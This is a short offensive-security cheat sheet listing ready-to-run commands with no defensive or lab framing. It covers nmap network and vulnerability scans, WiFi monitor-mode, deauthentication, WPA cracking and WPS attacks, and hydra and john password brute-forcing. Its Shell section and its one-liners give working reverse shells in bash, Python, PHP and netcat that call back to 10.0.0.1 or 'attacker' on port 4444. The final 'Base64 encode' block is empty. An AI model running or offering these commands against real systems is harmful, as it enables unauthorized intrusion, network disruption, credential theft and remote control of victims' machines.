# Ultimate Cheat Sheet - Quick Reference

## Nmap
```bash
nmap -sn 192.168.1.0/24           # Discover
nmap -sS -sV -p- target            # Full scan
nmap -sU target                    # UDP scan
nmap -O target                     # OS detect
nmap -A target                     # Aggressive
nmap --script vuln target          # Vuln scan
nmap -oA results target             # All outputs
nmap -iL targets.txt               # From file
```

## WiFi
```bash
airmon-ng start wlan0              # Monitor
airodump-ng wlan0mon               # Scan
aireplay-ng -0 10 -a MAC wlan0mon  # Deauth
aircrack-ng -w wordlist cap        # Crack
reaver -i wlan0mon -b MAC -vv      # WPS
```

## Password
```bash
hydra -L users.txt -P pass.txt target ssh

john --wordlist=wordlist.txt hash
```

## Shell
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
python -c 'import socket,subprocess;s=socket.socket();s.connect(("10.0.0.1",4444));subprocess.call(["/bin/sh","-i"])'
php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3");'
```

## Useful One-Liners
```bash
# Download
curl -O http://site.com/file

# HTTP server
python3 -m http.server 8000

# Port scan
for p in {1..1000}; do echo >/dev/tcp/host/$p 2>/dev/null && echo $p; done

# Reverse shell
nc -e /bin/sh attacker 4444

# Base64 encode

```
